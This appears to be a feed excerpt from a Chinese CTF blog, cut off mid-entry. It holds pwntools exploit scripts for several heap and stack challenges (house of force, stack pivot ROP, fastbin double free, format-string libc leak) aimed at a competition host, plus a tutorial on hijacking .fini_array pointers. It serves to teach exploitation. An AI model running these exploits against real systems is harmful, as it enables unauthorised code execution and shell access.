    <content type="html"><![CDATA[<h2 id="force"><a href="#force" class="headerlink" title="force"></a>force</h2><p>标准的house of force，先申请较大的内存页，可泄露出libc基址，<br>然后申请较小堆块，溢出修改top chunk的size为0xffffffffffffffff,申请堆块到__malloc_hook附近，这里用onegadget，不满足条件，可修改为system函数，然后申请”/bin/sh”所在地址的堆块，即可getshell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 0x4ff010#0x4aa010#0x4ec010#</span><br><span class="line">while True:</span><br><span class="line">warn(hex(offset))</span><br><span class="line">try:    </span><br><span class="line">    p = process(&apos;./pwn&apos;)</span><br><span class="line">    #p = remote(&apos;123.56.85.29&apos;,7147)</span><br><span class="line">    def add(size,content):</span><br><span class="line">        p.sendlineafter(&apos;1:&apos;,&apos;1&apos;)</span><br><span class="line">        p.sendlineafter(&apos;size&apos;,str(size))</span><br><span class="line">        p.recvuntil(&apos;addr &apos;)</span><br><span class="line">        addr = int(p.recvuntil(&apos;\n&apos;,drop = True),16)</span><br><span class="line">        p.sendafter(&apos;content&apos;,content)</span><br><span class="line">        return addr</span><br><span class="line"></span><br><span class="line">    chunk1 = add(0x100000,&apos;aaaa&apos;)</span><br><span class="line"></span><br><span class="line">    info(hex(chunk1))</span><br><span class="line">    libc = chunk1 - offset</span><br><span class="line">    info(hex(libc))</span><br><span class="line"></span><br><span class="line">    chunk2 = add(0x28,&apos;\xff&apos;*0x30)+0x20</span><br><span class="line">    info(hex(chunk2))</span><br><span class="line"></span><br><span class="line">    mallochook = libc+0x3c4b10</span><br><span class="line">    chunk3 = add(mallochook-chunk2-0x20,&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">    chunk4 = add(0x20,p64(libc+0x45390)*4)</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    #pause()</span><br><span class="line">    p.sendlineafter(&apos;1:&apos;,&apos;1&apos;)</span><br><span class="line">    p.sendafter(&apos;size&apos;,str(libc+0x18cd57))</span><br><span class="line">    print(p.recv())</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">except Exception as e:</span><br><span class="line">    offset-=0x1000</span><br><span class="line">    p.close()</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><h2 id="BorrowStack"><a href="#BorrowStack" class="headerlink" title="BorrowStack"></a>BorrowStack</h2><p>栈溢出0x10字节，栈迁移到bss段后，构造rop链。<br>需要注意的是，要尽量迁移到距离bss段更远的地址，为了防止bss段上面的got表被修改。<br>因为在调用函数时，栈由高地址向低地址生长，可能会修改到got表里面的内容。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">offest=152</span><br><span class="line"></span><br><span class="line">#while (1):</span><br><span class="line">try:</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,3635)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./pwn&apos;)</span><br><span class="line">bss_addr=0x601080</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">#gdb.attach(p, &quot;b *0x400680&quot;)</span><br><span class="line">payload=&apos;a&apos;*0x60+p64(bss_addr+offest)+p64(0x400699)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;b&apos;*offest+p64(bss_addr+offest)+p64(0x400703)+p64(elf.got[&quot;read&quot;])+p64(elf.sym[&quot;puts&quot;])+p64(0x400626)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">leak=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_addr=leak-libc.sym[&quot;read&quot;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Tell me what you want\n&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x60+p64(0)+p64(libc_addr+0x4526a)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">payload=&apos;b&apos;*0x10</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">print offest</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br><span class="line">#p.close()</span><br><span class="line">except:</span><br><span class="line">offest=offest+1</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><h2 id="Some-thing-exceting"><a href="#Some-thing-exceting" class="headerlink" title="Some_thing_exceting"></a>Some_thing_exceting</h2><p>flag已经被写到bss段内，用double free漏洞申请堆块到bss段，然后输出堆块内容即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./excited&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,6484)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">e=ELF(&apos;./excited&apos;)</span><br><span class="line">def show(index):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def new(lenght,cont,lenght2,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght2))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line"></span><br><span class="line">def delete(num):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(0x60,&apos;a&apos;*0x8,0x50,&apos;\x10&apos;*0x8)</span><br><span class="line">new(0x60,&apos;b&apos;*0x8,0x50,&apos;\x11&apos;*0x8)</span><br><span class="line">new(0x60,&apos;c&apos;*0x8,0x50,&apos;\x12&apos;*0x8)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">bss_addr=0x6020A8</span><br><span class="line">new(0x50,p64(bss_addr-0x10),0x50,&apos;\x14&apos;*4)</span><br><span class="line"></span><br><span class="line">new(0x50,&apos;\x16&apos;*4,0x50,&apos;\x17&apos;*1)</span><br><span class="line">show(1)</span><br><span class="line">print p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Some-thing-interesting"><a href="#Some-thing-interesting" class="headerlink" title="Some_thing_interesting"></a>Some_thing_interesting</h2><p>格式化字符漏洞泄露libc基址，然后double free修改malloc_hook为onegadget</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./interested&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,3041)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">e=ELF(&apos;./interested&apos;)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def new(lenght,cont,lenght2,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght2))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line"></span><br><span class="line">def edit(index,cont,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line">def check():</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line">#info(p.recv(49))</span><br><span class="line">#leak=int(p.recv(12),16)</span><br><span class="line">p.recvline()</span><br><span class="line">leak=int(p.recvline()[31:43],16)</span><br><span class="line">print hex(leak)</span><br><span class="line">pause()</span><br><span class="line">return leak</span><br><span class="line">def delete(num):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.send(&apos;OreOOrereOOreO%17$p&apos;)</span><br><span class="line"></span><br><span class="line">libc_addr=check()-0x20830</span><br><span class="line"></span><br><span class="line">new(0x40,&apos;a&apos;*0x8,0x60,&apos;\x10&apos;*0x8) #1</span><br><span class="line">new(0x40,&apos;b&apos;*0x8,0x60,&apos;\x11&apos;*0x8) #2</span><br><span class="line">new(0x40,&apos;c&apos;*0x8,0x60,&apos;\x12&apos;*0x8) #3</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">new(0x60,p64(libc_addr+libc.sym[&quot;__malloc_hook&quot;]-0x23),0x60,&apos;\x14&apos;*4)</span><br><span class="line"></span><br><span class="line">new(0x60,&apos;\x16&apos;*4,0x60,&apos;\x1f&apos;*0x13+p64(libc_addr+0xf1147))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(0x60))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BFnote"><a href="#BFnote" class="headerlink" title="BFnote"></a>BFnote</h2><p>一个栈溢出，然后在bss上写值，申请任意大小的chunk，以chunk为基址进行任意偏移写</p><p>栈溢出被canary拦住了，预期解是通过申请很大的chunk，会mmap到libc附近地址，接着通过偏移改写TLS中的canary，接着就是常规ROP的操作了，可以ret2dlresolve，也可以爆破1/4096直接改写got表为system，调用即可。还看到了另一位师傅的wp，使用mprotect改bss可执行，写入shellcode就行了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;force&quot;&gt;&lt;a href=&quot;#force&quot; class=&quot;headerlink&quot; title=&quot;force&quot;&gt;&lt;/a&gt;force&lt;/h2&gt;&lt;p&gt;标准的house of force，先申请较大的内存页，可泄露出libc基址，&lt;br&gt;然后申请较小堆块，溢出修改to
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>.fini_array段劫持</title>
    <link href="https://nocbtm.github.io/2020/02/20/%C2%96-fini-array%E6%AE%B5%E5%8A%AB%E6%8C%81/"/>
    <id>https://nocbtm.github.io/2020/02/20/-fini-array段劫持/</id>
    <published>2020-02-20T08:47:00.000Z</published>
    <updated>2020-04-07T02:37:36.711Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接: <a href="https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2019/12/19/fini_array%e6%ae%b5%e5%8a%ab%e6%8c%81/</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大多数可执行文件是通过链接 libc 来进行编译的，因此 gcc 会将 glibc 初始化代码放入编译好的可执行文件和共享库中。 .init_array和 .fini_array 节（早期版本被称为 .ctors和 .dtors ）中存放了指向初始化代码和终止代码的函数指针。 .init_array 函数指针会在 main() 函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。 .fini_array 函数指针在 main() 函数执行完之后才被触发，在某些场景下这一点会非常有用。例如，特定的堆溢出漏洞（如曾经的 Once upon a free()）会允许攻击者在任意位置写4个字节，攻击者通常会使用一个指向 shellcode 地址的函数指针来重写.fini_array 函数指针。对于大多数病毒或者恶意软件作者来说， .init_array 函数指针是最常被攻击的目标，因为它通常可以使得寄生代码在程序的其他部分执行之前就能够先运行。</p><h2 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo 1"></a>Demo 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void start(void) __attribute__ ((constructor));</span><br><span class="line">static void stop(void) __attribute__ ((destructor));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start == %p\n"</span>, start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stop == %p\n"</span>, stop);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"goodbye world!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc为函数提供了几种类型的属性，其中两个是我们特别感兴趣的：构造函数(constructors)和析构函数(destructors)。程序员应当使用类似下面的方式来指定这些属性：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static void start(void) __attribute__ ((constructor));</span><br><span class="line">static void stop(void) __attribute__ ((destructor));</span><br></pre></td></tr></table></figure><p>带有”构造函数”属性的函数将在main()函数之前被执行，而声明为”析构函数”属性的函数则将在<em>after</em> main()退出时执行。</p><p>程序运行结果如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array gcc test.c -o test</span><br><span class="line">➜  fini_array ls</span><br><span class="line">test  test.c</span><br><span class="line">➜  fini_array ./test</span><br><span class="line">hello world!</span><br><span class="line">start == 0x4005a4</span><br><span class="line">stop == 0x4005b5</span><br><span class="line">goodbye world!</span><br></pre></td></tr></table></figure></p><p>下载我们试试 objdump -h ./test</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array objdump -h ./test</span><br><span class="line">18 .init_array   00000010  0000000000600e00  0000000000600e00  00000e00  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">19 .fini_array   00000010  0000000000600e10  0000000000600e10  00000e10  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>可以看到.init_array的地址为 0x600e00 , .fini_array的地址为 0x600e10</p><p>在gdb中分别对这两个地址跟踪一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4xg 0x600e00</span><br><span class="line">0x600e00:0x00000000004005400x00000000004005a4</span><br><span class="line">0x600e10:0x00000000004005200x00000000004005b5</span><br></pre></td></tr></table></figure><p>分析一下结果<br>.init_array存的 0x400540是 frame_dummy函数地址(ida里面可查看) 0x4005a4很明显是自己定义的start函数的地址</p><p>.fini_array存的 0x400540是 __do_global_dtors_aux函数地址(ida里面可查看) 0x4005b5 很明显是定义的stop函数的地址</p><h2 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo 2"></a>Demo 2</h2><p>我们再看一个例子,其实就是前面的test程序函数少了属性，我把它定义成静态函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start == %p\n"</span>, start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stop == %p\n"</span>, stop);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"goodbye world!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样编译和运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array gcc test2.c -o test</span><br><span class="line">➜  fini_array ./test</span><br><span class="line">start == 0x4005a4</span><br><span class="line">stop == 0x4005b5</span><br></pre></td></tr></table></figure><p>函数地址并没有变化，但是因为start/stop函数未设定析构与构造属性，所以没有在开始和结束时被调用。</p><p>我们试试 objdump -h ./test2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  fini_array objdump -h ./test2</span><br><span class="line">18 .init_array   00000008  0000000000600e10  0000000000600e10  00000e10  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">19 .fini_array   00000008  0000000000600e18  0000000000600e18  00000e18  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>可以看到.init_array的地址为 0x600e10 , .fini_array的地址为 0x600e18，和test程序有点偏差。</p><p>现在我用gdb跟踪一波，查看一下.fini_array</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2xg 0x600e18</span><br><span class="line">0x600e18:    0x0000000000400530    0x0000000000000000</span><br></pre></td></tr></table></figure><p>明显0x0000000000400530后面的函数指针没有被填充 是0x0000000000000000，所以程序结束后不会执行stop函数</p><p>现在我们控制程序执行流程，怎么控制呢？我把.fini_array的函数指针0x0000000000400530覆盖成stop函数的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set &#123;int&#125;0x600e18=0x4005b5</span><br><span class="line">pwndbg&gt; x/2xg 0x600e18 </span><br><span class="line">0x600e18:    0x00000000004005b5    0x0000000000000000</span><br></pre></td></tr></table></figure><p>输入c继续执行程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">start == 0x4005a4</span><br><span class="line">stop == 0x4005b5</span><br><span class="line">goodbye world!</span><br><span class="line">[Inferior 1 (process 7442) exited normally]</span><br></pre></td></tr></table></figure><p>成功执行了stop函数，如果stop函数是一段onegadget或shellcode我们就可以直接拿下shell</p><h2 id="分析与总结"><a href="#分析与总结" class="headerlink" title="分析与总结"></a>分析与总结</h2><p>我们来关心一下，上面的stop在什么地方被调用。</p><p>栈回溯跟踪看一下</p><figure class="highlight plain"><table><tr><td 